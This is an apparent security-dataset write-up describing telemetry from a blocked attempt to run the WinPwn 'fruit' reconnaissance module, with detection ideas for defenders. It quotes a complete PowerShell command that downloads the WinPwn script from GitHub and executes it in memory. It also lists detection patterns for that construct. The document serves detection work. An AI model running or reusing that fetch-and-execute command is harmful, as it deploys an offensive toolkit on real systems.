# T1046-8: Network Service Discovery — WinPwn - fruit

## Technique Context

T1046 Network Service Discovery encompasses various methods adversaries use to enumerate services running on remote hosts. The WinPwn framework's "fruit" module represents a PowerShell-based reconnaissance tool that typically performs network service enumeration, port scanning, and service fingerprinting. This technique is fundamental to post-compromise lateral movement planning, as attackers need to map available services before attempting to move laterally through a network. Detection communities focus on identifying reconnaissance patterns, especially bulk network scanning behaviors, unusual PowerShell network operations, and the characteristic command patterns of automated enumeration tools.

## What This Dataset Contains

This dataset captures an attempt to execute the WinPwn "fruit" module, which was blocked by Windows Defender's AMSI (Antimalware Scan Interface) protection. The key telemetry includes:

**PowerShell Execution Chain**: Security event 4688 shows the initial PowerShell process creation with command line `"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') fruit -noninteractive -consoleoutput}`. The script attempts to download and execute the WinPwn framework directly from GitHub.

**AMSI Blocking**: PowerShell event 4100 shows the critical blocking action: "This script contains malicious content and has been blocked by your antivirus software" with error ID ScriptContainedMaliciousContent. This occurred during the `Invoke-Expression` command attempting to execute the downloaded WinPwn script.

**Network Activity**: Sysmon event 22 captures DNS resolution for `raw.githubusercontent.com` to multiple GitHub CDN IPs (185.199.111.133, 185.199.108.133, 185.199.109.133, 185.199.110.133), indicating the download attempt reached the network layer.

**Process Telemetry**: Sysmon events 1 show the PowerShell process creation (PID 21976) and a `whoami.exe` execution (PID 21428) that succeeded before the main payload was blocked. Multiple Sysmon event 7s capture .NET runtime and Windows Defender component loading into the PowerShell processes.

## What This Dataset Does Not Contain

The dataset lacks actual network service discovery activity because Windows Defender's AMSI blocked the WinPwn script before execution. There are no network scanning patterns, port enumeration attempts, or service discovery commands that would typically characterize T1046 activity. No Sysmon event 3 (network connections) show actual reconnaissance traffic to target hosts. The blocking occurred at the script download/execution phase, preventing any subsequent service discovery behaviors from manifesting in the telemetry.

## Assessment

This dataset provides excellent visibility into defense evasion attempts and PowerShell-based attack tool deployment, but limited insight into actual network service discovery techniques. The Security event 4688 process creation logging captures the full command line with the malicious URL, while PowerShell event 4100 definitively shows the AMSI blocking action. Sysmon's DNS query logging (event 22) provides valuable network indicators. However, for T1046 detection development, this dataset is more valuable for understanding how tools like WinPwn are deployed rather than their operational reconnaissance behaviors. The telemetry would be stronger if it included the actual service discovery commands and network scanning patterns that would execute post-deployment.

## Detection Opportunities Present in This Data

1. **PowerShell Web Download Detection**: Monitor Security event 4688 for PowerShell command lines containing `new-object net.webclient).downloadstring` combined with GitHub raw URLs, especially when followed by immediate execution patterns.

2. **WinPwn Framework Indicators**: Alert on command lines containing the specific WinPwn GitHub repository URL (`S3cur3Th1sSh1t/WinPwn`) and characteristic module names like "fruit".

3. **AMSI Block Correlation**: Correlate PowerShell event 4100 "ScriptContainedMaliciousContent" blocks with preceding network activity to identify blocked attack tool deployment attempts.

4. **Suspicious PowerShell Process Chains**: Flag PowerShell processes spawning other PowerShell instances with complex command line arguments containing download and execution patterns.

5. **GitHub Raw Content Access**: Monitor Sysmon event 22 DNS queries for `raw.githubusercontent.com` from PowerShell processes, especially when correlated with subsequent AMSI blocks or security tool alerts.

6. **Reconnaissance Tool Command Pattern**: Watch for PowerShell executions with parameters like `-noninteractive -consoleoutput` combined with network-related module names, indicating automated tool execution.
